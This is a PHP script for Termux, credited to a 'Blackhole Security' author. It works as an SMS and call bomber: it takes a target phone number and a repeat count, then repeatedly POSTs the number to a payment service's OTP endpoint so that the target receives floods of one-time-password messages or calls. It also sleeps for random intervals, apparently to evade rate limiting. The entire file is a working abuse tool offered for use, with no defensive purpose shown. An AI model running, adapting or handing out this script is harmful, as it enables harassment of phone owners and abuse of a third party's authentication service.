#!/data/data/com.termux/files/usr/bin/php
<?php
system('clear');
$green  = "\e[92m";
$red    = "\e[91m";
$yellow = "\e[93m";
$blue   = "\e[36m";
echo "\n$yellow
   __   _  _             ___  _____    ___ 
  / /  (_)| |_   ___    /___\/__   \  / _ \
 / /   | || __| / _ \  //  //  / /\/ / /_)/
/ /___ | || |_ |  __/ / \_//  / /   / ___/ 
\____/ |_| \__| \___| \___/   \/    \/";
echo "\n$blue
Author  : Cvar1984
Code    : PHP
Github  : http://github.com/Cvar1984
Team    : Blackhole Security
Version : 2.0 ( Alpha )
Date    : 13-03-2018\n";
echo "$red=========================== Cvar1984 ))=====(@)>$green\n";
@header('Content-Type: text/html; charset=UTF-8');
function input($echo) {
    echo "$echo --> ";
}
input("Phone Number ex: 62888xxxxx");
$nope=trim(fgets(STDIN));
input("Call / SMS [c/s]");
$tipe=trim(fgets(STDIN));
if($tipe == "s") {
input("Count");
$count = trim(fgets(STDIN));
$param="msisdn={$nope}&accept=";
} else {
	$count="1";
	$param="msisdn={$nope}&accept=call";
}
echo "$red=========================== Cvar1984 ))=====(@)>$green\n";

for($x = 0; $x < $count; $x++) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://www.tokocash.com/oauth/otp');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,$param);
    curl_setopt($ch, CURLOPT_POST, 1);
    $tampil=curl_exec($ch);
    curl_close($ch);
    echo "Send OTP To -> $nope"."\n";
    if(preg_match('/otp_attempt_left/', $tampil)) {
    	echo $green."OTP Send Success\n";
    	} else {
    		die("$red"."OTP Send Failed\n");
    	}
    $sleep = array(
        "10",
        "5",
        "1",
    ); // Detik
    $slp   = array_rand($sleep);
    $slp2  = $sleep[$slp];
    echo "Sleeping For $slp2 Second\n";
    echo "$red=========================== Cvar1984 ))=====(@)>$green\n";
    sleep($slp2); // Random Interval
}
?>